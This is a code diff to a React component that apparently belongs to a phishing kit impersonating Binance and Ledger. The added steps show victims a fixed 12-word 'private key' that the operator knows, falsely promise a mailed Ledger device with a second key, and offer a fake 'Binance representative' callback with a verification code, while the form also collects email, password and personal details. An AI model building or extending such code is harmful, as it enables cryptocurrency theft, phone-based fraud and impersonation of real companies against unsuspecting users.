@@ -2,8 +2,9 @@ import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { AlertTriangle } from "lucide-react";
 import { Checkbox } from "@/components/ui/checkbox";
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 
-type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success';
+type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success' | 'private-key' | 'confirmation';
 
 const countries = [
   "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Netherlands", "Belgium",
@@ -24,6 +25,8 @@ const BinanceLedgerForm: FC = () => {
   const [errors, setErrors] = useState<{[key: string]: string}>({});
   const [isTransitioning, setIsTransitioning] = useState(false);
   const [confirmationChecked, setConfirmationChecked] = useState(false);
+  const [showPrivateKey, setShowPrivateKey] = useState(false);
+  const [isCallDialogOpen, setIsCallDialogOpen] = useState(false);
   const [personalDetails, setPersonalDetails] = useState({
     firstName: "",
     lastName: "",
@@ -34,6 +37,12 @@ const BinanceLedgerForm: FC = () => {
     country: "",
     phoneNumber: ""
   });
+
+  // Generate a mock private key (12 words)
+  const privateKeyWords = [
+    "abandon", "ability", "able", "about", "above", "absent", 
+    "absorb", "abstract", "absurd", "abuse", "access", "accident"
+  ];
 
   const transitionToStep = (newStep: FormStep) => {
     setIsTransitioning(true);
@@ -143,6 +152,18 @@ const BinanceLedgerForm: FC = () => {
     }, 20000); // 20 seconds = 20,000 milliseconds
   };
 
+  const handleConnectLedger = () => {
+    transitionToStep('private-key');
+  };
+
+  const handleShowPrivateKey = () => {
+    setShowPrivateKey(true);
+  };
+
+  const handlePrivateKeyNext = () => {
+    transitionToStep('confirmation');
+  };
+
   const handlePaste = async () => {
     try {
       const text = await navigator.clipboard.readText();
@@ -182,10 +203,12 @@ const BinanceLedgerForm: FC = () => {
       'personal-details': 'Verify Details',
       summary: 'Review Information',
       verifying: 'Verifying',
-      success: 'Verification Successful'
+      success: 'Verification Successful',
+      'private-key': 'Private Key Generation',
+      confirmation: 'Confirmation'
     };
 
-    if (currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary') {
+    if (currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation') {
       return null; // Title handled in content for these states
     }
 
@@ -233,8 +256,180 @@ const BinanceLedgerForm: FC = () => {
     );
   };
 
-  // Render special states (important notice, summary, verifying, success)
+  // Render special states (important notice, summary, verifying, success, private-key, confirmation)
   const renderSpecialState = () => {
+    if (currentStep === 'confirmation') {
+      return (
+        <div className="text-center" style={{ minHeight: "450px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
+          <div 
+            className="text-sm font-semibold font-binance mb-6"
+            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+          >
+            Final Confirmation
+          </div>
+          
+          <div className="text-left mb-6">
+            <div className="text-xs font-binance text-white leading-relaxed mb-4">
+              <strong>Next Step:</strong><br/>
+              Binance will ship your Ledger device by mail, and the package will include instructions on how to generate your second key.
+            </div>
+            
+            <div className="bg-yellow-500/10 border border-yellow-500/20 rounded p-3 mb-4">
+              <div className="text-xs font-binance text-yellow-400 leading-relaxed">
+                <strong>⚠️ Security Reminder:</strong><br/>
+                • Your private key has been securely saved<br/>
+                • Keep it safe and never share it with anyone<br/>
+                • Binance will never ask for your private keys or passwords
+              </div>
+            </div>
+          </div>
+
+          <div className="mt-auto space-y-3">
+            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
+              <DialogTrigger asChild>
+                <button
+                  type="button"
+                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
+                  style={{
+                    backgroundColor: "transparent",
+                    color: "var(--color-BtnBg, #FCD535)",
+                    height: "34px"
+                  }}
+                >
+                  Request a Call from a Binance Representative
+                </button>
+              </DialogTrigger>
+              <DialogContent className="bg-[#1E2329] border-[#474D57]">
+                <DialogHeader>
+                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
+                </DialogHeader>
+                <div className="text-xs font-binance text-white leading-relaxed">
+                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
+                </div>
+              </DialogContent>
+            </Dialog>
+
+            <button
+              type="button"
+              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+              style={{
+                backgroundColor: "var(--color-BtnBg, #FCD535)",
+                color: "var(--color-TextOnYellow, #202630)",
+                height: "34px"
+              }}
+            >
+              Complete Setup
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    if (currentStep === 'private-key') {
+      return (
+        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
+          <div className="flex-1">
+            <div 
+              className="text-sm font-semibold font-binance mb-4"
+              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+            >
+              Private Key Generation
+            </div>
+            
+            <div className="text-left space-y-4 mb-5">
+              <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
+                <div className="text-xs font-binance text-red-400 leading-relaxed">
+                  <strong>⚠️ Important Security Notice:</strong><br/>
+                  • Make sure no one is watching when you view or store your keys<br/>
+                  • Never share your private key over the phone or by email<br/>
+                  • Binance will never ask you for your private keys or passwords
+                </div>
+              </div>
+
+              {!showPrivateKey ? (
+                <div className="text-xs font-binance text-white leading-relaxed">
+                  In the next step, you will see a Show Private Key button. A 12-word recovery phrase will be generated that you must store securely. Once you click Next, you will no longer be able to retrieve this phrase from this page.
+                </div>
+              ) : (
+                <div>
+                  <div className="text-xs font-binance text-white mb-3">
+                    <strong>Your Private Key (Recovery Phrase):</strong>
+                  </div>
+                  <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 mb-3">
+                    <div className="grid grid-cols-3 gap-2 text-xs font-binance text-white">
+                      {privateKeyWords.map((word, index) => (
+                        <div key={index} className="flex items-center">
+                          <span className="text-gray-400 mr-1">{index + 1}.</span>
+                          <span>{word}</span>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                  <div className="text-xs font-binance text-yellow-400">
+                    ⚠️ Store this phrase securely. You will not be able to retrieve it after proceeding.
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+
+          <div className="mt-auto space-y-3">
+            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
+              <DialogTrigger asChild>
+                <button
+                  type="button"
+                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
+                  style={{
+                    backgroundColor: "transparent",
+                    color: "var(--color-BtnBg, #FCD535)",
+                    height: "34px"
+                  }}
+                >
+                  Request a Call from a Binance Representative
+                </button>
+              </DialogTrigger>
+              <DialogContent className="bg-[#1E2329] border-[#474D57]">
+                <DialogHeader>
+                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
+                </DialogHeader>
+                <div className="text-xs font-binance text-white leading-relaxed">
+                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
+                </div>
+              </DialogContent>
+            </Dialog>
+
+            {!showPrivateKey ? (
+              <button
+                type="button"
+                onClick={handleShowPrivateKey}
+                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+                style={{
+                  backgroundColor: "var(--color-BtnBg, #FCD535)",
+                  color: "var(--color-TextOnYellow, #202630)",
+                  height: "34px"
+                }}
+              >
+                Show Private Key
+              </button>
+            ) : (
+              <button
+                type="button"
+                onClick={handlePrivateKeyNext}
+                className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+                style={{
+                  backgroundColor: "var(--color-BtnBg, #FCD535)",
+                  color: "var(--color-TextOnYellow, #202630)",
+                  height: "34px"
+                }}
+              >
+                Next
+              </button>
+            )}
+          </div>
+        </div>
+      );
+    }
+
     if (currentStep === 'summary') {
       return (
         <div style={{ minHeight: "350px", display: "flex", flexDirection: "column" }}>
@@ -410,25 +605,91 @@ const BinanceLedgerForm: FC = () => {
 
     if (currentStep === 'success') {
       return (
-        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
-          <div 
-            className="text-xs font-semibold font-binance mb-5"
-            style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-          >
-            Verification Successful
+        <div style={{ minHeight: "450px", display: "flex", flexDirection: "column" }}>
+          <div className="flex-1">
+            <div 
+              className="text-sm font-semibold font-binance mb-4"
+              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+            >
+              Connect Ledger
+            </div>
+            
+            <div className="text-left space-y-4 mb-5">
+              <div className="text-xs font-binance text-white leading-relaxed">
+                We're now taking an important step to enhance the security of your assets. Please prepare your Ledger device to ensure maximum protection of your funds.
+              </div>
+              
+              <div className="text-xs font-binance text-white leading-relaxed">
+                <strong>Your Ledger device uses a two-key security system:</strong>
+              </div>
+              
+              <div className="bg-[#2B3139] border border-[#474D57] rounded p-3 space-y-2">
+                <div className="text-xs font-binance text-white">
+                  • One key is automatically generated for you here. Please store this key in a secure place, as it is essential for accessing your assets.
+                </div>
+                <div className="text-xs font-binance text-white">
+                  • The second key can be generated by you once you receive your Ledger device at home.
+                </div>
+                <div className="text-xs font-binance text-white">
+                  • Together, these two keys ensure the highest level of protection for your account.
+                </div>
+              </div>
+              
+              <div className="bg-red-500/10 border border-red-500/20 rounded p-3">
+                <div className="text-xs font-binance text-red-400 leading-relaxed">
+                  <strong>⚠️ Important Security Notice:</strong><br/>
+                  • Never share your keys with anyone<br/>
+                  • Binance will never ask you for your private keys or passwords<br/>
+                  • Make sure no one is watching when you view or store your keys
+                </div>
+              </div>
+              
+              <div className="text-xs font-binance text-white leading-relaxed">
+                <strong>How It Works:</strong><br/>
+                When you click Show Private Key, a 12–24-word recovery phrase will be generated. You must store this phrase securely. Once you click Next, you will no longer be able to retrieve this phrase from this page.
+              </div>
+            </div>
           </div>
-          <button
-            type="button"
-            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-            style={{
-              backgroundColor: "var(--color-BtnBg, #FCD535)",
-              color: "var(--color-TextOnYellow, #202630)",
-              height: "34px"
-            }}
-            aria-label="Connect Ledger"
-          >
-            Connect Ledger
-          </button>
+
+          <div className="mt-auto space-y-3">
+            <Dialog open={isCallDialogOpen} onOpenChange={setIsCallDialogOpen}>
+              <DialogTrigger asChild>
+                <button
+                  type="button"
+                  className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 border border-yellow-500/50 font-bold font-binance text-xs"
+                  style={{
+                    backgroundColor: "transparent",
+                    color: "var(--color-BtnBg, #FCD535)",
+                    height: "34px"
+                  }}
+                >
+                  Request a Call from a Binance Representative for Phone Support
+                </button>
+              </DialogTrigger>
+              <DialogContent className="bg-[#1E2329] border-[#474D57]">
+                <DialogHeader>
+                  <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
+                </DialogHeader>
+                <div className="text-xs font-binance text-white leading-relaxed">
+                  A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
+                </div>
+              </DialogContent>
+            </Dialog>
+
+            <button
+              type="button"
+              onClick={handleConnectLedger}
+              className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+              style={{
+                backgroundColor: "var(--color-BtnBg, #FCD535)",
+                color: "var(--color-TextOnYellow, #202630)",
+                height: "34px"
+              }}
+              aria-label="Connect Ledger"
+            >
+              Connect Ledger
+            </button>
+          </div>
         </div>
       );
     }
@@ -1109,7 +1370,7 @@ const BinanceLedgerForm: FC = () => {
   };
 
   // Check if we should show special states
-  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary';
+  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary' || currentStep === 'private-key' || currentStep === 'confirmation';
 
   return (
     <div 
